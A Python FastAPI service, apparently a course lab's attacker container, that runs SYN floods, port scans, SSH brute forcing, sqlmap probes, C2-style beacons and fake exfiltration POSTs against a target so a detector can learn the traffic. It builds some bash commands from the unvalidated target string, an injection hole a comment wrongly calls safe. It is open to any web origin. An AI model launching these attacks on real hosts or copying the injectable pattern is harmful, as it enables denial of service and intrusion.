"""Attacker container HTTP API.

POST /attack { preset, target, duration_s? } → runs the matching tool against
`target` for at most `duration_s` seconds, captures stdout/stderr, returns the
result. The FE will call this when the user clicks "Run on lab" next to a
preset on the Examples tab.

Each preset maps to ONE course tool. The traffic shape produced by that tool
is what the detector + model are expected to classify back into the same
category.
"""
from __future__ import annotations

import shlex
import subprocess
import time
from typing import Literal

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field

PresetName = Literal[
    "BENIGN",
    "DDoS",
    "DoS",
    "PortScan",
    "BruteForce",
    "WebAttack",
    "Botnet",
    "Infiltration",
]


class AttackRequest(BaseModel):
    preset: PresetName
    target: str = Field(..., description="hostname/IP of the victim container")
    duration_s: int = Field(8, ge=1, le=60, description="hard time-cap on the tool")


class AttackResult(BaseModel):
    preset: str
    tool: str
    command: str
    returncode: int
    stdout: str
    stderr: str
    duration_s: float
    timed_out: bool


# Each preset is (tool name, argv builder). The argv is built fresh per request
# so we can interpolate the target hostname safely (no shell expansion).
def _argv_for(preset: PresetName, target: str, duration_s: int) -> tuple[str, list[str]]:
    if preset == "BENIGN":
        # Steady HTTP GETs in a loop — benign browser-like traffic.
        return "curl-loop", [
            "bash", "-c",
            f"for i in $(seq 1 30); do curl -s -o /dev/null -w '%{{http_code}}\\n' "
            f"http://{target}/ ; sleep 0.3; done",
        ]
    if preset == "DDoS":
        # SYN flood, capped by --rand-source for spoofing patterns + duration.
        return "hping3", [
            "timeout", str(duration_s),
            "hping3", "--flood", "-S", "-p", "80", target,
        ]
    if preset == "DoS":
        # Single-source, slower-rate SYN.
        return "hping3", [
            "timeout", str(duration_s),
            "hping3", "-i", "u500", "-S", "-p", "80", target,
        ]
    if preset == "PortScan":
        return "nmap", [
            "nmap", "-sS", "-T4", "-Pn", "-p", "1-1024", target,
        ]
    if preset == "BruteForce":
        # SSH brute force against the defender's sshd. Tiny wordlists — the model
        # only needs the *traffic shape*, not a successful login.
        return "hydra", [
            "timeout", str(duration_s),
            "hydra", "-t", "4", "-f",
            "-L", "/app/wordlists/users.txt",
            "-P", "/app/wordlists/pass.txt",
            f"ssh://{target}",
        ]
    if preset == "WebAttack":
        # sqlmap against the nginx root — it'll get 404s but the probe pattern
        # (long URLs, many requests with payloads) is what the model picks up.
        return "sqlmap", [
            "timeout", str(duration_s),
            "sqlmap", "-u", f"http://{target}/?id=1",
            "--batch", "--level", "1", "--risk", "1", "--smart",
            "--disable-coloring", "--flush-session",
        ]
    if preset == "Botnet":
        # C2 beacon: regular, low-volume callouts at a fixed interval.
        return "curl-beacon", [
            "bash", "-c",
            f"for i in $(seq 1 {duration_s}); do "
            f"curl -s -o /dev/null http://{target}/c2/checkin?id=$i ; sleep 1; done",
        ]
    if preset == "Infiltration":
        # Exfil pattern: sustained large outbound POSTs.
        return "curl-exfil", [
            "bash", "-c",
            f"for i in $(seq 1 5); do "
            f"head -c 1048576 /dev/urandom | "
            f"curl -s -o /dev/null --data-binary @- http://{target}/upload ; "
            f"sleep 0.5; done",
        ]
    raise HTTPException(400, f"unknown preset: {preset}")


app = FastAPI(title="AnomalyDetector lab attacker", version="0.1.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["POST", "GET"],
    allow_headers=["*"],
)


@app.get("/health")
def health() -> dict:
    return {"status": "ok"}


@app.get("/tools")
def tools() -> dict:
    """Quick visibility — show which tools are present in the container."""
    out = {}
    for tool in ("nmap", "hping3", "hydra", "sqlmap", "curl"):
        try:
            r = subprocess.run(["which", tool], capture_output=True, text=True, timeout=2)
            out[tool] = r.stdout.strip() or None
        except Exception as exc:
            out[tool] = f"err: {exc}"
    return out


@app.post("/attack", response_model=AttackResult)
def attack(req: AttackRequest) -> AttackResult:
    tool, argv = _argv_for(req.preset, req.target, req.duration_s)
    cmd_str = " ".join(shlex.quote(a) for a in argv)

    started = time.time()
    timed_out = False
    try:
        proc = subprocess.run(
            argv,
            capture_output=True,
            text=True,
            # Outer guard — should never trip because we use `timeout` inside argv,
            # but cap the API request anyway.
            timeout=req.duration_s + 10,
        )
        rc = proc.returncode
        stdout = proc.stdout[-4000:]
        stderr = proc.stderr[-4000:]
    except subprocess.TimeoutExpired as exc:
        timed_out = True
        rc = -1
        stdout = (exc.stdout or b"").decode("utf-8", errors="replace")[-4000:]
        stderr = (exc.stderr or b"").decode("utf-8", errors="replace")[-4000:]
    elapsed = time.time() - started

    return AttackResult(
        preset=req.preset,
        tool=tool,
        command=cmd_str,
        returncode=rc,
        stdout=stdout,
        stderr=stderr,
        duration_s=round(elapsed, 2),
        timed_out=timed_out,
    )
